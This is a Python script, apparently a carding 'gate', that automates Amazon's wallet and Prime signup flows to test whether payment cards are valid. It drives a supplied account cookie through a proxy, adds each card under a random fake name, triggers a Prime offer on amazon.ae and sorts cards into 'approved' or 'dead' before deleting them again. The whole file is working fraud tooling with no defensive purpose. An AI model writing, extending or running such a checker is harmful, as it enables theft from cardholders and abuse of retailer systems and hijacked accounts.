import aiohttp
import asyncio
import random
import re
import json
from bs4 import BeautifulSoup

class AmazonEngine:
    def __init__(self, cookie, proxy=None):
        self.cookie = cookie
        self.proxy = proxy
        self.base_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }

    def edit_cookie(self, target_country, cookie):
        country_map = {
            'AU': {'code': 'acbau', 'lang': 'en_AU', 'currency': 'AUD'},
            'DE': {'code': 'acbde', 'lang': 'de_DE', 'currency': 'EUR'},
            'CA': {'code': 'acbca', 'lang': 'en_CA', 'currency': 'CAD'},
            'CN': {'code': 'acbcn', 'lang': 'zh_CN', 'currency': 'CNY'},
            'SG': {'code': 'acbsg', 'lang': 'en_SG', 'currency': 'SGD'},
            'ES': {'code': 'acbes', 'lang': 'es_ES', 'currency': 'EUR'},
            'US': {'code': 'main', 'lang': 'en_US', 'currency': 'USD'},
            'FR': {'code': 'acbfr', 'lang': 'fr_FR', 'currency': 'EUR'},
            'NL': {'code': 'acbnl', 'lang': 'nl_NL', 'currency': 'EUR'},
            'IN': {'code': 'acbin', 'lang': 'hi_IN', 'currency': 'INR'},
            'IT': {'code': 'acbit', 'lang': 'it_IT', 'currency': 'EUR'},
            'JP': {'code': 'acbjp', 'lang': 'ja_JP', 'currency': 'JPY'},
            'MX': {'code': 'acbmx', 'lang': 'es_MX', 'currency': 'MXN'},
            'PL': {'code': 'acbpl', 'lang': 'pl_PL', 'currency': 'PLN'},
            'AE': {'code': 'acbae', 'lang': 'ar_AE', 'currency': 'AED'},
            'UK': {'code': 'acbuk', 'lang': 'en_GB', 'currency': 'GBP'},
            'TR': {'code': 'acbtr', 'lang': 'tr_TR', 'currency': 'TRY'},
            'BR': {'code': 'acbbr', 'lang': 'pt_BR', 'currency': 'BRL'},
            'EG': {'code': 'acbeg', 'lang': 'ar_EG', 'currency': 'EGP'},
        }
        
        current_code = 'main'
        # Detect current code in cookie if possible, but PHP logic just replaces all
        for country, details in country_map.items():
            if details['code'] != 'main' and details['code'] in cookie:
                current_code = details['code']
                break
        
        target = country_map.get(target_country, country_map['US'])
        
        # PHP replacement logic
        for details in country_map.values():
            cookie = cookie.replace(details['code'], target['code'])
            cookie = cookie.replace(details['lang'], target['lang'])
            cookie = cookie.replace(details['currency'], target['currency'])
            
        return cookie.strip()

    async def get_tokens(self, session, url, headers):
        async with session.get(url, headers=headers, proxy=self.proxy) as resp:
            text = await resp.text()
            soup = BeautifulSoup(text, "html.parser")
            
            # Simple regex search for tokens in the response text (Amazon embeds these in JSON/JS strings)
            session_id = re.search(r'"sessionId":"([^"]*)"', text)
            serialized_state = re.search(r'"serializedState":"([^"]*)"', text)
            customer_id = re.search(r'"customerID":"([^"]*)"', text)
            
            return {
                "sessionId": session_id.group(1) if session_id else "",
                "serializedState": serialized_state.group(1) if serialized_state else "",
                "customerID": customer_id.group(1) if customer_id else "",
                "text": text
            }

    async def delete_card(self, session):
        headers = self.base_headers.copy()
        headers.update({
            "Referer": "https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo",
            "Cookie": self.cookie
        })
        
        tokens = await self.get_tokens(session, "https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo", headers)
        
        if "card ending in" in tokens['text'].lower() or "debit card" in tokens['text'].lower():
            # Extract instrumentId if present
            instr_match = re.search(r'"instrumentId":"([^"]*)"', tokens['text'])
            if instr_match:
                instr_id = instr_match.group(1)
                data = {
                    f"ppw-widgetEvent:StartDeleteEvent:{json.dumps({'iid': instr_id, 'renderPopover': 'true'})}": "",
                    "ppw-jsEnabled": "true",
                    "ppw-widgetState": tokens['serializedState'],
                    "ie": "UTF-8"
                }
                
                cont_url = f"https://www.amazon.com/payments-portal/data/widgets2/v1/customer/{tokens['customerID']}/continueWidget"
                async with session.post(cont_url, headers=headers, data=data, proxy=self.proxy) as resp:
                    resp_text = await resp.text()
                    widget_state = re.search(r'name="ppw-widgetState" value="([^"]*)"', resp_text)
                    if widget_state:
                        data2 = {
                            "ppw-widgetEvent:DeleteInstrumentEvent": "",
                            "ppw-jsEnabled": "true",
                            "ppw-widgetState": widget_state.group(1),
                            "ie": "UTF-8"
                        }
                        await session.post(cont_url, headers=headers, data=data2, proxy=self.proxy)
        return True

    async def add_card(self, session, card, month, year, cvv, name):
        # 1. Reset Wallet
        await self.delete_card(session)
        
        # 2. Get tokens for adding card
        curr_cookie = self.edit_cookie('US', self.cookie)
        headers = self.base_headers.copy()
        headers["Cookie"] = curr_cookie
        
        # a. Get initial serializedState
        tokens = await self.get_tokens(session, "https://www.amazon.com/cpe/yourpayments/wallet", headers)
        if not tokens['customerID']:
            return {"status": "error", "response": "Could not fetch customerID"}
            
        # b. StartAddInstrumentEvent
        cont_url = f"https://www.amazon.com/payments-portal/data/widgets2/v1/customer/{tokens['customerID']}/continueWidget"
        data_add = {
            "ppw-jsEnabled": "true",
            "ppw-widgetState": tokens['serializedState'],
            "ppw-widgetEvent": "StartAddInstrumentEvent"
        }
        async with session.post(cont_url, headers=headers, data=data_add, proxy=self.proxy) as resp:
            text_add = await resp.text()
            ser_state_2 = re.search(r'"serializedState":"([^"]*)"', text_add)
            if not ser_state_2:
                return {"status": "error", "response": "Failed to start instrument event"}
                
        # c. Register PM (Iframe source)
        reg_url = "https://apx-security.amazon.com/cpe/pm/register"
        reg_headers = headers.copy()
        reg_headers["Origin"] = "https://www.amazon.com"
        reg_data = {
            "widgetState": ser_state_2.group(1),
            "clientId": "AB:YA:MPO",
            "usePopover": "true",
            "maxAgeSeconds": "900",
            "hideAddPaymentInstrumentHeader": "true",
            "creatablePaymentMethods": "CC"
        }
        async with session.post(reg_url, headers=reg_headers, data=reg_data, proxy=self.proxy) as resp:
            reg_text = await resp.text()
            widget_state_final = re.search(r'<input type="hidden" name="ppw-widgetState" value="([^"]*)">', reg_text)
            if not widget_state_final:
                return {"status": "error", "response": "Failed to get final widget state"}
        
        # d. AddCreditCardEvent
        add_url = f"https://apx-security.amazon.com/payments-portal/data/widgets2/v1/customer/{tokens['customerID']}/continueWidget?sif_profile=APX-Encrypt-All-NA"
        add_data = {
            "ppw-widgetEvent:AddCreditCardEvent": "",
            "ppw-jsEnabled": "true",
            "ppw-widgetState": widget_state_final.group(1),
            "ie": "UTF-8",
            "addCreditCardNumber": card,
            "ppw-accountHolderName": name,
            "ppw-expirationDate_month": month,
            "ppw-expirationDate_year": year,
            "ppw-updateEverywhereAddCreditCard": "updateEverywhereAddCreditCard",
            "usePopover": "true",
            "creatablePaymentMethods": "CC"
        }
        async with session.post(add_url, headers=reg_headers, data=add_data, proxy=self.proxy) as resp:
            add_resp_text = await resp.text()
            # If successful, it returns address selection
            if "ppw-widgetState" in add_resp_text:
                return {"status": "success", "response": "Card added successfully"}
            return {"status": "error", "response": "Failed to add card"}

    async def prime_signup(self, session):
        # Port of prime_teste from UAE (.ae)
        ae_cookie = self.edit_cookie('AE', self.cookie)
        headers = self.base_headers.copy()
        headers.update({
            "Host": "www.amazon.ae",
            "Cookie": ae_cookie,
            "Referer": "https://www.amazon.ae/"
        })
        
        # 1. Pipeline Member Signup
        async with session.get("https://www.amazon.ae/gp/prime/pipeline/membersignup", headers=headers, proxy=self.proxy) as resp:
            text = await resp.text()
            cust_id = re.search(r'"customerID":"([^"]*)"', text)
            sess_id = re.search(r'"sessionId":"([^"]*)"', text)
            token = re.search(r'name="ppw-widgetState" value="([^"]*)"', text)
            offer_token = re.search(r'name="offerToken" value="([^"]*)"', text)
            
            if not token:
                return "error"
            
            # 2. SavePaymentPreferenceEvent
            cont_url = f"https://www.amazon.ae/payments-portal/data/widgets2/v1/customer/{cust_id.group(1)}/continueWidget"
            save_data = {
                "ppw-jsEnabled": "true",
                "ppw-widgetState": token.group(1),
                "ppw-widgetEvent": "SavePaymentPreferenceEvent"
            }
            async with session.post(cont_url, headers=headers, data=save_data, proxy=self.proxy) as resp:
                save_text = await resp.text()
                instr_id = re.search(r'"preferencePaymentMethodIds":"\[\\"([^\\"]*)\\"\]"', save_text)
                
                if not instr_id:
                    return "error"
                
                # 3. Final Accept Offer
                final_url = "https://www.amazon.ae/hp/wlp/pipeline/actions"
                final_data = {
                    "offerToken": offer_token.group(1),
                    "session-id": sess_id.group(1),
                    "locationID": "prime_confirm",
                    "paymentMethodId": instr_id.group(1),
                    "actionPageDefinitionId": "WLPAction_AcceptOffer_HardVet"
                }
                async with session.post(final_url, headers=headers, data=final_data, proxy=self.proxy) as resp:
                    return await resp.text()

    async def check(self, card, month, year, cvv):
        async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True)) as session:
            try:
                # Add Name
                names = ["Marcos", "Lucas", "Smith", "John", "David", "Miller"]
                name = f"{random.choice(names)} {random.choice(names)}"
                
                # Normalize Year
                if len(year) == 2: year = "20" + year
                month = month.zfill(2)
                
                # 1. Add Card
                add_res = await self.add_card(session, card, month, year, cvv, name)
                if add_res['status'] == "error":
                    return {"status": "dead", "response": add_res['response'], "gate": "Amazon Pro"}
                
                # 2. Prime Test
                prime_res = await self.prime_signup(session)
                
                # 3. Cleanup
                await self.delete_card(session)
                
                # 4. Parse Results
                if "BILLING_ADDRESS_RESTRICTED" in prime_res:
                    return {"status": "approved", "response": "Authorised (00) ✅", "gate": "Amazon Pro"}
                if any(x in prime_res for x in ["InvalidInput", "HARDVET_VERIFICATION_FAILED", "hardVet"]):
                    return {"status": "dead", "response": "Authorization Refused", "gate": "Amazon Pro"}
                    
                return {"status": "dead", "response": "Cookie Expired or Auth Failed", "gate": "Amazon Pro"}

            except Exception as e:
                return {"status": "error", "response": f"Engine Error: {str(e)}", "gate": "Amazon Pro"}
